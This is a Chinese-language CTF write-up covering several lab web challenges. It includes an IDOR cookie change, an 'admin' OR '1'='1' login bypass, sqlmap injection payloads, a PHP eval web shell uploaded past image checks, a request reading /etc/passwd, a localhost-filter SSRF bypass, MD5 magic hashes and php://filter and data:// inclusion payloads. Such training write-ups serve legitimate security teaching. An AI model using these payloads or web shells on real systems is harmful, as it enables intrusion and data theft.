# Unboxing

![image-20250708163116174](.\assets\image-20250708163116174.png)

​	访问地址我们看到了如下页面，结合题目描述中申先生的账号 ID 是 6，密码的 md5 是 6d8fc80ae8d10ce7d179d9bef28df666，我们就可以获得一个登录账号密码。

​	本题目中的密码通过了md5加密，我们可以通过[md5在线解密破解,md5解密加密](https://www.cmd5.com/default.aspx)这个网站，进行解密，解密结果为kaihe。

![image-20250708163540224](.\assets\image-20250708163540224.png)

​	通过分析发现，在cookie中有一个uid值为6，怀疑该网站存在平级跨权访问漏洞，修改cookie的值为1，显示结果如下。

![image-20250708163721656](.\assets\image-20250708163721656.png)

​	依次访问我们就可以拿到flag。

​	开盒喵

# 图书馆

![image-20250708164521012](.\assets\image-20250708164521012.png)

​	本题目中直接把账号密码传入了sql语句，因此这里有了sql注入点，我们可以构造`admin' OR '1'='1`，这样sql语句就成了`SELECT * FROM users WHERE username = '`admin' OR '1'='1' AND password = ''，条件恒为1，这样就可以登录进入系统里。

​	进入系统之后就可以查看图书，其中访问图书的时候地址为`[图书馆系统 - 图书详情](http://hostname.com/book?id=1`，怀疑id传入的点有sql注入，于是添加'截断字符串，访问地址`http://hostname.com/book?id=1'`，页面输出`查询失败，请重试: (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1''' at line 1")`，确认为sql注入点，开始注入工作。

​	之后我们使用注入工具sqlmap进行注入（当然我们也同样可以使用sqlmap来检测注入点）。

​	这里我们通过使用sql注入进入了系统，为了储存我们的登陆状态，我们有自己的cookie，在使用sqlmap时候我们可以使用如下语法`sqlmap -u "https://hostname.com/book?id=1" --cookie="COOKIE"`来检测注入点，输出如下：

```shell
[17:02:50] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] Y
sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 5375=5375 AND 'cHSM'='cHSM

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: id=1' AND GTID_SUBSET(CONCAT(0x7162716b71,(SELECT (ELT(9581=9581,1))),0x7171717a71),9581) AND 'XkAv'='XkAv

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 4447 FROM (SELECT(SLEEP(5)))OBYc) AND 'mKpu'='mKpu

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: id=1' UNION ALL SELECT NULL,CONCAT(0x7162716b71,0x57785a53554b6a6651566b6155764a544858417671657750414e7054504450776c7a766c4c4c5461,0x7171717a71),NULL,NULL,NULL-- -
---
```

​	发现注入点之后，我们就可以进行利用，我们使用语句`sqlmap -u "https://hostname.com/book?id=1" --cookie="COOKIE" --dbs`查看数据库中的所有库。

```shell
[17:11:51] [INFO] fetching database names
available databases [5]:
[*] information_schema
[*] library
[*] mysql
[*] performance_schema
[*] sys
```

​	获取到数据库之后我们就可以使用`-D`指定数据库，使用`--tables`查看数据库中的表。

```shell
[17:13:34] [INFO] fetching tables for database: 'library'
Database: library
[3 tables]
+-------+
| books |
| flag  |
| users |
+-------+
```

​	我们看到了其中有flag表，我们就可以使用`-T`参数指定表，使用`--dump`获取表中的数据。

## 补充

​	详细使用方法可以查看[SQLmap使用教程图文教程（非常详细）从零基础入门到精通，看完这一篇就够了。-CSDN博客](https://blog.csdn.net/dzqxwzoe/article/details/132683722)，感觉写的不错。

# Imagehost

​	经典的图床题目，能用来检测的方法也没集中，首先这个系统是php构建的，那我们就来写一个🐎。

````php
// img.php

<?php 
@eval($_REQUEST['qwq']);
````

​	之后重命名为img.png上传，系统返回：`这不是图片，别想骗我😡`

​	之后就是文件头检测，常见文件文件头如下：

```shell
JPEG (图片文件)
文件头：FF D8 FF
文件尾：FF D9
PNG (图片文件)
文件头：89 50 4E 47 0D 0A 1A 0A
文件尾：49 45 4E 44 AE 42 60 82
GIF (图片文件)
文件头：47 49 46 38 37 61 或 47 49 46 38 39 61
文件尾：00 3B
PDF (文档文件)
文件头：25 50 44 46 2D
文件尾：25 25 45 4F 46
ZIP (压缩文件)
文件头：50 4B 03 04
文件尾：通常没有固定的文件尾标识，但文件结构以50 4B 05 06或50 4B 06 06结尾。
RAR (压缩文件)
文件头：52 61 72 21 1A 07 00
文件尾：没有固定的文件尾标识。
MP3 (音频文件)
文件头：通常以FF FB或FF F3开头。
文件尾：没有固定的文件尾标识。
AVI (视频文件)
文件头：52 49 46 46 (RIFF) 后跟 41 56 49 20 (AVI)
文件尾：没有固定的文件尾标识。
```

​	我们使用十六进制编辑器把文件头加上去，有一个vscode拓展Hex Editor可以编辑，还有Hexer也可以。

​	添加之后上传，系统输出：`php？扬了😋`，估计是检测php字段，那我们删了重新上传就好，系统输出：`上传成功，保存至tmp/img.png`。

​	`img.png`很显然无法调用，这时候我们可以使用Burp Suite抓包重放。

```http
POST /upload.php HTTP/1.1
Host: train2025.hitctf.cn:25808
Content-Length: 225
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://train2025.hitctf.cn:25808
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvYBkkrDgeQpJpsun
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://train2025.hitctf.cn:25808/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

------WebKitFormBoundaryvYBkkrDgeQpJpsun
Content-Disposition: form-data; name="file"; filename="img.png" # 修改为php
Content-Type: image/png

```

​	服务器返回：`上传成功，保存至tmp/img.php`

​	访问`http://hostname.com/tmp/img.php?qwq=system('cat /etc/passwd');`验证一下。

​	之后直接拿flag就好了。

# Spider

​	先拿dirsearch扫一下。

```shell
[11:21:33] Starting: 
[11:21:38] 403 -  287B  - /.ht_wsr.txt
[11:21:38] 403 -  287B  - /.htaccess.bak1
[11:21:38] 403 -  287B  - /.htaccess.orig
[11:21:38] 403 -  287B  - /.htaccess.sample
[11:21:38] 403 -  287B  - /.htaccess.save
[11:21:38] 403 -  287B  - /.htaccessBAK
[11:21:38] 403 -  287B  - /.htaccess_orig
[11:21:38] 403 -  287B  - /.htaccess_sc
[11:21:38] 403 -  287B  - /.htaccess_extra
[11:21:38] 403 -  287B  - /.htaccessOLD
[11:21:38] 403 -  287B  - /.htaccessOLD2
[11:21:38] 403 -  287B  - /.htm
[11:21:38] 403 -  287B  - /.html
[11:21:38] 403 -  287B  - /.htpasswd_test
[11:21:38] 403 -  287B  - /.htpasswds
[11:21:38] 403 -  287B  - /.httr-oauth
[11:22:15] 200 -   31B  - /robots.txt
[11:22:16] 403 -  287B  - /server-status/
[11:22:16] 403 -  287B  - /server-status

Task Completed
```

​	访问robots.txt获取内容。

```shell
Disallow: /secret_flag_here.php
```

​	访问输出`只有我自己能看到 flag`

​	可以通过前面提供的Lilac爬虫中心来以本机ip访问本机内容，但是里面检测到127.0.0.1和localhost都会拒绝访问输出`我 spider 就是饿死，死外面，也不会爬取自己！`。

​	我们使用`LOcalHosT`访问就好。

# MD5

```php
<?php

include("flag.php");

highlight_file(__FILE__);

if (isset($_POST['a']) and isset($_POST['b'])) {
    if ($_POST['a'] != $_POST['b'] and md5($_POST['a']) == md5($_POST['b']))
        echo $flag1;
else
    print 'Wrong.';
}

if (isset($_POST['c']) and isset($_POST['d'])) {
    if ($_POST['c'] != $_POST['d'] and md5($_POST['c']) === md5($_POST['d']))
        echo $flag2;
else
    print 'Wrong.';
}

?>
```

```shell
# flag1
s1502113478a
0e861580163291561247404381396064
  
s1885207154a
0e509367213418206700842008763514
  
s1836677006a
0e481036490867661113260034900752
  
s155964671a
0e342768416822451524974117254469
  
s1184209335a
0e072485820392773389523109082030
#弱比较，使用科学记数法绕过

#flag2
使用数组绕过c[]=1&b[]=2
```

# LFI1

```php
// php伪协议读取文件内容
php://filter/read=convert.base64-encode/resource=flag.php
```

服务器返回`PD9waHANCg0KZWNobyAiZmxhZ+WcqOi/me+8jOS9huaYr+S9oOeci+S4jeWIsO+8jOWTiOWTiOWTiO+8ge+8ge+8gSI7DQokZmxhZz0iZmxhZ3tlMDU2MjE0OS1iNTU2LTQ2MTAtYWM1OC01NjQzMjk5ZGY0YWR9IjsNCg==`

base64解码即可`echo "flag在这，但是你看不到，哈哈哈！！！";
$flag="flag{e0562149-b556-4610-ac58-5643299df4ad}";`

# LFI2

```do
FROM php:8-apache-buster

COPY app /var/www/html

RUN cp /usr/local/etc/php/php.ini-production /usr/local/etc/php/php.ini && \
    sed -i 's/allow_url_include = Off/allow_url_include = On/g' /usr/local/etc/php/php.ini

RUN chown root /var/www/html && \
    chgrp root /var/www/html && \
    chmod -R 555 /var/www/html
```

```php
// index.php
<?php

if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);
}
```

```
file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=
# PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs ===> <?php system('cat flag.php');
```
